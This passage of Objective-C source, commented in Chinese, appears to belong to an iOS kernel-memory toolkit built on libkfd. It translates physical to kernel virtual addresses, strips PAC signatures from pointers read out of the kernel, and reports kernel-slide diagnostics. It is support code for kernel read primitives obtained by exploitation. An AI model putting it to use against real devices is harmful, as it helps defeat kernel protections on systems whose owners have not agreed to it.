     * PA→KVA 基准）是否都成立"，而本函数承诺的是"PA→KVA 可不可用"。改动之后两者
     * 仍同真同假（提交点与 g_slideSettled 在同一个临界区里前后脚置位），但判据落在
     * 被使用的那一件东西上（见 km_phystokv_ready 的定义），下游才不必跟着上游的
     * 合并语义走 —— 以后哪一边的判据松了，这里自动跟上。
     *
     * 特别注意**不算失败**的一种情形：ptov_table 不可信（真机上就撞上了）。
     * 那时查表路径停用、兜底支照跑，本函数返回 true —— 这正是本轮改动的目的。
     *
     * km_slide_resolve 内部会按需调 km_xpf_init()（KernelSlide.m:1904）。
     *
     * 关于"失败之后可以重来"，这里要划边界（KernelSlide.h 写了完整理由）：
     * 重跑这条路只有在 **kread 那一侧**才有意义。XPF 的 finder 返回值（包括 0）
     * 会被上游连同 cached 标志一起缓存（libxpf/xpf/xpf.c:702-705），而
     * km_xpf_init() 在 ready 时直接返回 true（XpfBridge.m:108-111）—— 所以某个键的
     * finder 返回过 0 之后，本进程内每次重跑都会拿到同一个 0，本函数会稳定失败。
     * 真要重试必须先 km_xpf_deinit()（几十秒重解析）；本函数**不**隐式做这件事，
     * 因为那等于把一个几十秒的副作用藏进"再点一次按钮"里。
     */
    (void)km_slide_resolve();
    return km_phystokv_ready();
}

/*
 * 无锁版本，只在已持有 g_slideLock 的路径里用（resolve 自己的抽样验证）。
 * 公开的 km_phystokv 是它的加锁包装 —— 分开写是为了避免自己把自己锁死。
 */
static uint64_t slide_phystokv_locked(uint64_t pa)
{
    if (!g_convertReady) return 0;

    /*
     * ① 逐段查表，条件与判据逐字对照 perf.h:240-244。
     *
     * **只在表被判据认定为可信时才查**（g_ptovTrusted，判据见 slide_read_ptov_table
     * 上方那段注释）：不可信的表里每一项都可能来自邻近的标量全局，拿它的 (pa, va)
     * 命中去算，得到的是一个"形态合法"的**段外**地址 —— 那正是 KernelMemory.m
     * 记着的 bug_type 210 那一路。表不可信时，兜底支就是唯一路径。
     */
    if (g_ptovTrusted) {
        for (uint64_t i = 0; i < KM_SLIDE_PTOV_COUNT && g_ptov[i].len != 0; i++) {
            if (pa >= g_ptov[i].pa && pa < (g_ptov[i].pa + g_ptov[i].len)) {
                return pa - g_ptov[i].pa + g_ptov[i].va;
            }
        }
    }

    /*
     * ② 兜底支（perf.h:246-247）。上游用 assert 表达"只有 pa 落在
     *    [gPhysBase, gPhysBase + gPhysSize) 里才允许走兜底"；本工程不能用 assert
     *    （libkfd 的 assert 宏会走 kfd_assert_handler，而那个 handler 会 longjmp
     *    到早已退出的 kopen 现场），所以把同一个约束写成显式判据：
     *    不满足就返回 0 —— 0 是安全哨兵，内核 VA 不可能是 0。
     *
     * 为什么这条判据值得留着（而不是"有就得给个值"）：段外换算算出来的是
     * **别处**的地址，它既不是目标页、也未必落在内核映射区里。宁可报"换算不出来"。
     * 本轮**没有**放宽它 —— 表被停用之后它成了唯一的守门人，更不该放。
     */
    if (pa < g_physBase || (pa - g_physBase) >= g_physSize) return 0;

    /*
     * ③ 输出再过一次形态检查。本文件头部那条纪律是"每一条送进 km_read* 的地址，
     *    使用前都要过形态检查"，而本函数的返回值正是 km_read64 的输入
     *    （那边只判 `(addr >> 48) == 0xFFFF`，比这一道松）。
     *    多这一道不会挡掉正确结果：pa 落在 [gPhysBase, +gPhysSize) 且三个基准可信时，
     *    结果必然落在 [gVirtBase, gVirtBase + gPhysSize) 内，也就是内核域。
     *    它挡的是"某个基准被读成一个巨大的错值"这一类 —— 那种情况下算出来的数
     *    会跌出内核域，而下一个动作就是拿它去解引用。
     */
    const uint64_t kva = pa - g_physBase + g_virtBase;
    return km_slide_kernel_ptr(kva) ? kva : 0;
}

uint64_t km_phystokv(uint64_t pa)
{
    pthread_mutex_lock(&g_slideLock);
    const uint64_t kva = slide_phystokv_locked(pa);
    pthread_mutex_unlock(&g_slideLock);
    return kva;
}

/*
 * ═══ 导出的 PAC 还原（读取链上的第二个闸门）═══
 *
 * 为什么这个函数必须存在、且必须导出：kread 从内核结构里读回来的**指针字段**
 * 是 PAC 签名的，高 17 位是签名而不是地址。真机上实测到的形态（本文件写这条注释
 * 时的现场）：
 *      task+0x28（vm_map）读回 0x52bc7e10023e93c0
 *      形态判据看高 16 位（km_is_kernel_address 口径）→ 0x52bc ≠ 0xFFFF → 不过
 *      还原后                    0xfffffe10023e93c0 → 高 16 位 0xFFFF → 过
 * 于是"读到了正确的值、却在形态检查那一关被枪毙"变成了整条链上的唯一断点。
 *
 * 上游同样每次都还原（libkfd/info.h:144-145 / 151-152 / 166-167 / 173-174），
 * 本文件自己也一直在做（slide_read_kernel_ptr，.m:432-436 的注释写了完整的
 * 推导与纪律）。缺的只是**一个给别的模块用的入口** —— 这就是本函数。
 *
 * 幂等性（调用方最该记住的一条）：
 *   · 内核地址的 bit 55 恒为 1（内核 VA 从 0xfffffe… 起），走 `p | pacMask` 那一支，
 *     而 pacMask 的每一位本来就是 1 —— **不会改动已经置位的位，结果等于入参**。
 *     所以"从内核读出来、后面当地址用"的值可以无脑过一遍。
 *   · 用户态地址的 bit 55 为 0，走 `p & ptrMask` 那一支 —— 它会把 bit 47 以上
 *     **全部清掉**。所以**绝对不要拿本函数处理用户态地址**（例如 posix_memalign
 *     返回的那类指针）：那不是"没变化"，那是把地址改坏。
 *
 * 不加锁是刻意的，不是遗漏：调用点（KernelPhysWindow / KernelPhysMap 的读取链）
 * 已经持有自己的锁，而 km_slide_resolve / km_phystokv 都要取 g_slideLock ——
 * 在这里再取一次就是同一把锁上的自锁死（本工程已经在 slide_phystokv 的前向声明
 * 注释里记着同一个坑）。所以这里用无锁的缓存读。
 *
 * 首次解析发生在调用方已经持有别的锁的时候，而 km_xpf_resolve_symbol 自身不取
 * g_slideLock（slide_t1sz 就是这么调的，见 .m:514-524），所以不会构成锁序反转。
 * 并发首调最坏的结果是两个线程各解析一次、缓存里留下同一个值 ——
 * 解析是幂等的，没有任何副作用。
 */
uint64_t km_unsign_ptr(uint64_t p)
{
    return slide_unsign_ptr(p, slide_unsign_t1sz_cached());
}

NSString *km_slide_diagnostic(void)
{
    pthread_mutex_lock(&g_slideLock);

    NSString *text = nil;
    if (g_diagText[0] != '\0') {
        text = [NSString stringWithUTF8String:g_diagText];
    }
    if (text == nil) {
        text = @"== Slide 诊断 ==\n还没算过：点面板上的「Slide」按钮。\n";
    }

    pthread_mutex_unlock(&g_slideLock);
    return text;
}
